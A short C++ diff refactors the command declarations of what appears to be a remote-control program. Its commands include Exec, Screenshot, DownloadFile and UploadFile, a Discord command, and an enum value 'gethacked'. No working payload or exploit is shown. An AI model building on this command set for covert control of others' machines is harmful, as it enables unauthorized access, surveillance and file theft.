@@ -25,12 +25,6 @@ enum class ShowoffCommandEnum {
     gethacked, hi
 };
 
-#define COMMAND(num, name, ...) \
-    class name##Command : public Command<num, __VA_ARGS__> { \
-    public: \
-        int execute(Controller&, ##__VA_ARGS__) override; \
-    }
-
 // navigation.cpp
 COMMAND(3, Navigation, NavigationCommandEnum, std::string);
 // discord.cpp
@@ -40,7 +34,12 @@ COMMAND(5, Exec, std::string, bool);
 // screen.cpp
 COMMAND(6, Screenshot);
 // audio.cpp
-COMMAND(7, Audio, AudioCommandEnum);
+COMMANDCLASS(7, Audio, AudioCommandEnum) {
+public:
+    int execute(Controller&, AudioCommandEnum) override;
+private:
+    
+};
 // files.cpp
 COMMAND(8, DownloadFile, std::string);
 COMMAND(9, UploadFile, std::string, std::vector<uint8_t>);
